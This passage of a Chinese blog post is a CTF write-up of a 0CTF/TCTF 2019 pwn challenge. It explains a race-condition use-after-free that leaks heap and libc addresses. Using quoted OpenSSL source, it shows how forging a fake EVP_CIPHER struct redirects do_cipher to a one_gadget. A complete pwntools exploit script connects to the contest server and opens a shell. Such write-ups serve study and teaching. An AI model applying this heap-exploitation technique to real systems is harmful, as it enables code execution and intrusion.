+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    add_task(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">'c'</span>*<span class="number">0x410</span>)<span class="comment">#因为它是ubuntu18，由tcache,所以分配一个大小超出tcache范围的chunk来泄露libc地址</span></span><br><span class="line">    add_task(<span class="number">5</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    go(<span class="number">20</span>)</span><br><span class="line">    delete(<span class="number">20</span>)</span><br><span class="line">    add_task(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">''</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'text: \n'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    data = data.replace(<span class="string">" "</span>,<span class="string">''</span>).strip()</span><br><span class="line"></span><br><span class="line">    plain = mc.decrypt(data)</span><br><span class="line">    leak_libc =u64(plain[:<span class="number">8</span>]) - <span class="number">0x3ebca0</span></span><br><span class="line">    libc_base = leak_libc</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x410</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure>
+<p>地址都泄露出来后，就要考虑怎么控制程序的执行流。这里因为是条件竞争造成的UAF，不能通过这个来构造overlapping chunk。这里通过UAF来劫持EVP_CIPHER_CTX结构体，通过伪造EVP_CIPHER_CTX结构体来劫持程序流。</p>
+<p>EVP_CipherUpdate源码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EVP_CipherUpdate</span><span class="params">(EVP_CIPHER_CTX *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> *out, <span class="keyword">int</span> *outl,</span></span></span><br><span class="line"><span class="function"><span class="params">                     <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *in, <span class="keyword">int</span> inl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;encrypt)</span><br><span class="line">        <span class="keyword">return</span> EVP_EncryptUpdate(ctx, out, outl, in, inl);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> EVP_DecryptUpdate(ctx, out, outl, in, inl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EVP_EncryptUpdate</span><span class="params">(EVP_CIPHER_CTX *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> *out, <span class="keyword">int</span> *outl,</span></span></span><br><span class="line"><span class="function"><span class="params">                      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *in, <span class="keyword">int</span> inl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* Prevent accidental use of decryption context when encrypting */</span></span><br><span class="line">    <span class="keyword">if</span> (!ctx-&gt;encrypt) &#123;</span><br><span class="line">        EVPerr(EVP_F_EVP_ENCRYPTUPDATE, EVP_R_INVALID_OPERATION);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> evp_EncryptDecryptUpdate(ctx, out, outl, in, inl);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">evp_EncryptDecryptUpdate</span><span class="params">(EVP_CIPHER_CTX *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">unsigned</span> <span class="keyword">char</span> *out, <span class="keyword">int</span> *outl,</span></span></span><br><span class="line"><span class="function"><span class="params">                                    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *in, <span class="keyword">int</span> inl)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, bl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;cipher-&gt;flags &amp; EVP_CIPH_FLAG_CUSTOM_CIPHER) &#123;</span><br><span class="line">        i = M_do_cipher(ctx, out, in, inl);		<span class="comment">//要劫持的目标</span></span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            *outl = i;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (inl &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        *outl = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> inl == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ctx-&gt;buf_len == <span class="number">0</span> &amp;&amp; (inl &amp; (ctx-&gt;block_mask)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (M_do_cipher(ctx, out, in, inl)) &#123;</span><br><span class="line">            *outl = inl;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            *outl = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    i = ctx-&gt;buf_len;</span><br><span class="line">    bl = ctx-&gt;cipher-&gt;block_size;</span><br><span class="line">    OPENSSL_assert(bl &lt;= (<span class="keyword">int</span>)<span class="keyword">sizeof</span>(ctx-&gt;buf));</span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bl - i &gt; inl) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;(ctx-&gt;buf[i]), in, inl);</span><br><span class="line">            ctx-&gt;buf_len += inl;</span><br><span class="line">            *outl = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = bl - i;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;(ctx-&gt;buf[i]), in, j);</span><br><span class="line">            <span class="keyword">if</span> (!M_do_cipher(ctx, out, ctx-&gt;buf, bl))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            inl -= j;</span><br><span class="line">            in += j;</span><br><span class="line">            out += bl;</span><br><span class="line">            *outl = bl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        *outl = <span class="number">0</span>;</span><br><span class="line">    i = inl &amp; (bl - <span class="number">1</span>);</span><br><span class="line">    inl -= i;</span><br><span class="line">    <span class="keyword">if</span> (inl &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!M_do_cipher(ctx, out, in, inl))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        *outl += inl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i != <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">memcpy</span>(ctx-&gt;buf, &amp;(in[inl]), i);</span><br><span class="line">    ctx-&gt;buf_len = i;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>EVP_CIPHER_CTX结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    ENGINE *engine;             <span class="comment">/* functional reference if 'cipher' is</span></span><br><span class="line"><span class="comment">                                 * ENGINE-provided */</span></span><br><span class="line">    <span class="keyword">int</span> encrypt;                <span class="comment">/* encrypt or decrypt */</span></span><br><span class="line">    <span class="keyword">int</span> buf_len;                <span class="comment">/* number we have left */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> oiv[EVP_MAX_IV_LENGTH]; <span class="comment">/* original iv */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> iv[EVP_MAX_IV_LENGTH]; <span class="comment">/* working iv */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[EVP_MAX_BLOCK_LENGTH]; <span class="comment">/* saved partial block */</span></span><br><span class="line">    <span class="keyword">int</span> num;                    <span class="comment">/* used by cfb/ofb/ctr mode */</span></span><br><span class="line">    <span class="keyword">void</span> *app_data;             <span class="comment">/* application stuff */</span></span><br><span class="line">    <span class="keyword">int</span> key_len;                <span class="comment">/* May change for variable length cipher */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;        <span class="comment">/* Various flags */</span></span><br><span class="line">    <span class="keyword">void</span> *cipher_data;          <span class="comment">/* per EVP data */</span></span><br><span class="line">    <span class="keyword">int</span> final_used;</span><br><span class="line">    <span class="keyword">int</span> block_mask;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> final[EVP_MAX_BLOCK_LENGTH]; <span class="comment">/* possible final block */</span></span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER_CTX */</span> ;</span><br></pre></td></tr></table></figure>
+<p>EVP_CIPHER结构体：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> nid;</span><br><span class="line">    <span class="keyword">int</span> block_size;</span><br><span class="line">    <span class="comment">/* Default value for variable length ciphers */</span></span><br><span class="line">    <span class="keyword">int</span> key_len;</span><br><span class="line">    <span class="keyword">int</span> iv_len;</span><br><span class="line">    <span class="comment">/* Various flags */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="comment">/* init key */</span></span><br><span class="line">    <span class="keyword">int</span> (*init) (EVP_CIPHER_CTX *ctx, <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key,</span><br><span class="line">                 <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *iv, <span class="keyword">int</span> enc);</span><br><span class="line">    <span class="comment">/* encrypt/decrypt data */</span></span><br><span class="line">    <span class="keyword">int</span> (*do_cipher) (EVP_CIPHER_CTX *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> *out,</span><br><span class="line">                      <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *in, <span class="keyword">size_t</span> inl);</span><br><span class="line">    <span class="comment">/* cleanup ctx */</span></span><br><span class="line">    <span class="keyword">int</span> (*cleanup) (EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="comment">/* how big ctx-&gt;cipher_data needs to be */</span></span><br><span class="line">    <span class="keyword">int</span> ctx_size;</span><br><span class="line">    <span class="comment">/* Populate a ASN1_TYPE with parameters */</span></span><br><span class="line">    <span class="keyword">int</span> (*set_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="comment">/* Get parameters from a ASN1_TYPE */</span></span><br><span class="line">    <span class="keyword">int</span> (*get_asn1_parameters) (EVP_CIPHER_CTX *, ASN1_TYPE *);</span><br><span class="line">    <span class="comment">/* Miscellaneous operations */</span></span><br><span class="line">    <span class="keyword">int</span> (*ctrl) (EVP_CIPHER_CTX *, <span class="keyword">int</span> type, <span class="keyword">int</span> arg, <span class="keyword">void</span> *ptr);</span><br><span class="line">    <span class="comment">/* Application data */</span></span><br><span class="line">    <span class="keyword">void</span> *app_data;</span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER */</span> ;</span><br></pre></td></tr></table></figure>
+<p>通过查看源码可以发现一条调用链：</p>
+<blockquote>
+<p>EVP_CipherUpdate -&gt;EVP_EncryptUpdate-&gt;M_do_cipher</p>
+</blockquote>
+<p>而 M_do_cipher实际上是对cipher+0x20处的函数指针的调用，所以具体利用思路是在堆中写入伪造的fake_cipher 结构体，fake_cipher结构体偏移0x20处填入one_gadget的地址，前面的仿照之前的cipher就可以了。然后利用UAF, 劫持ctx结构体，使其 cipher字段指向伪造的fake_cipher结构体，最后getshell。</p>
+<p>其实通过调试也可以发现EVP_CipherUpdate函数中存在一处相对调用，这里call [rax+0x20] ，rax是ctx结构体的cipher结构体的地址，而[rax+0x20] 则是 cipher中的 do_cipher函数指针。</p>
+<p><img src="/picture/1553949142123.png" alt="1553949142123"></p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process('./task')</span></span><br><span class="line">p = remote(<span class="string">"111.186.63.201"</span>,<span class="number">10001</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Myencrypt</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,Key,IV)</span>:</span></span><br><span class="line">        self.Key = Key</span><br><span class="line">        self.IV = IV</span><br><span class="line">        self.mode = AES.MODE_CBC</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        cipher = AES.new(self.Key,self.mode,self.IV)</span><br><span class="line">        length = <span class="number">32</span></span><br><span class="line">        len_d = len(data)</span><br><span class="line">        align = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> len_d%length !=<span class="number">0</span>:</span><br><span class="line">            align = length - len_d%length</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            align = <span class="number">0</span></span><br><span class="line">        data = data + align*<span class="string">'\0'</span></span><br><span class="line">        self.enc = cipher.encrypt(data) </span><br><span class="line">        <span class="keyword">return</span> b2a_hex(self.enc)       </span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(self,data)</span>:</span></span><br><span class="line">        cipher = AES.new(self.Key,self.mode,self.IV) </span><br><span class="line">        plain = cipher.decrypt(a2b_hex(data))</span><br><span class="line">        <span class="keyword">return</span> plain.strip(<span class="string">'\0'</span>)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_task</span><span class="params">(idx,cmd,size,data=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(cmd))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span> , str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>, data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Choice: "</span>,<span class="string">"3"</span>)   </span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))     </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_heap</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> heap_base </span><br><span class="line">    add_task(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0x8</span>,<span class="string">'d'</span>*<span class="number">0x8</span>)</span><br><span class="line">    add_task(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">'c'</span>*<span class="number">0x8</span>)</span><br><span class="line">    add_task(<span class="number">3</span>,<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">'c'</span>*<span class="number">0x8</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    go(<span class="number">2</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    add_task(<span class="number">2</span>,<span class="number">1</span>,<span class="number">0x8</span>,<span class="string">''</span>)</span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">'text: \n'</span>)</span><br><span class="line">    data = p.recvline(<span class="string">'\n'</span>)</span><br><span class="line">    data = data.replace(<span class="string">" "</span>,<span class="string">''</span>).strip()</span><br><span class="line"></span><br><span class="line">    plain = mc.decrypt(data)</span><br><span class="line">    heap_addr=u64(plain[:<span class="number">8</span>])</span><br><span class="line">    heap_base = heap_addr - <span class="number">0x14c0</span></span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x8</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line">    <span class="keyword">return</span> heap_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    add_task(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">'c'</span>*<span class="number">0x410</span>)</span><br><span class="line">    add_task(<span class="number">5</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x20</span>)</span><br><span class="line">    go(<span class="number">20</span>)</span><br><span class="line">    delete(<span class="number">20</span>)</span><br><span class="line">    add_task(<span class="number">20</span>,<span class="number">1</span>,<span class="number">0x410</span>,<span class="string">''</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'text: \n'</span>)</span><br><span class="line">    data = p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    data = data.replace(<span class="string">" "</span>,<span class="string">''</span>).strip()</span><br><span class="line"></span><br><span class="line">    plain = mc.decrypt(data)</span><br><span class="line">    leak_libc =u64(plain[:<span class="number">8</span>]) - <span class="number">0x3ebca0</span></span><br><span class="line">    libc_base = leak_libc</span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    p.send(<span class="string">'a'</span>*<span class="number">0x410</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">()</span>:</span></span><br><span class="line">    one_gadget = <span class="number">0x10a38c</span> + libc.address</span><br><span class="line">    success(hex(one_gadget))</span><br><span class="line">    fake_cipher =  p64(<span class="number">0x10000001ab</span>) + p64(<span class="number">0x1002</span>) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>) + p64(one_gadget)</span><br><span class="line">    add_task(<span class="number">0x20</span>,<span class="number">1</span>,<span class="number">0x28</span>,fake_cipher)</span><br><span class="line">    </span><br><span class="line">    add_task(<span class="number">11</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    add_task(<span class="number">12</span>,<span class="number">1</span>,<span class="number">0x70</span>,<span class="string">'a'</span>*<span class="number">0x70</span>)</span><br><span class="line">    add_task(<span class="number">13</span>,<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">'a'</span>*<span class="number">0x20</span>)</span><br><span class="line">    </span><br><span class="line">    go(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">12</span>)</span><br><span class="line">    delete(<span class="number">11</span>)</span><br><span class="line">    add_task(<span class="number">11</span>,<span class="number">1</span>,<span class="number">0xa8</span>,p64(heap_base + <span class="number">0x24b0</span>).ljust(<span class="number">0xa8</span>,<span class="string">'\x00'</span>)) <span class="comment"># control task_12 -&gt; ctx</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.interactive(<span class="string">"zs0zrc&gt;&gt;"</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#gdb.attach(p,"b EVP_CipherUpdate")</span></span><br><span class="line"></span><br><span class="line">heap_base = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">mc = Myencrypt(<span class="string">'a'</span>*<span class="number">0x20</span>,<span class="string">'b'</span>*<span class="number">0x10</span>)<span class="comment">#AES object</span></span><br><span class="line">leak_heap()</span><br><span class="line">leak_libc()</span><br><span class="line">get_shell()</span><br></pre></td></tr></table></figure>
+<p><img src="/picture/1553956567752.png" alt="1553956567752"></p>
+<p>哦豁，剩下的题目等哪天有空在复现吧…..真实难的真实</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+    <div>    
+      
+      
+      <ul class="post-copyright">
+        <li class="post-copyright-author">
+            <strong>本文作者：</strong>zs0zrc
+        </li>
+        <li class="post-copyright-link">
+          <strong>本文链接：</strong>
+          <a href="/2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/" title="0CTF/TCTF2019 PWN 复现">2019/03/26/2019-3-26-0CTFTCTF2019-PWN-复现/</a>
+        </li>
+        <li class="post-copyright-license">
+          <strong>版权： </strong>
+          本站文章均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议，请勿用于商业，转载注明出处！
+        </li>
+      </ul>
+      
+      </div>
+      
+        <div class="post-tags">
+          
+            <a href="/tags/writeup/" rel="tag"># writeup</a>
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+        </div>
+      
+      <div>
+      
+        
+      
+      </div>
+      <div>
+      
+        
+      
+      </div>
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/18/2019-3-18-tcache下的几道pwn题/" rel="next" title="tcache下的几道pwn题">
+                <i class="fa fa-chevron-left"></i> tcache下的几道pwn题
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
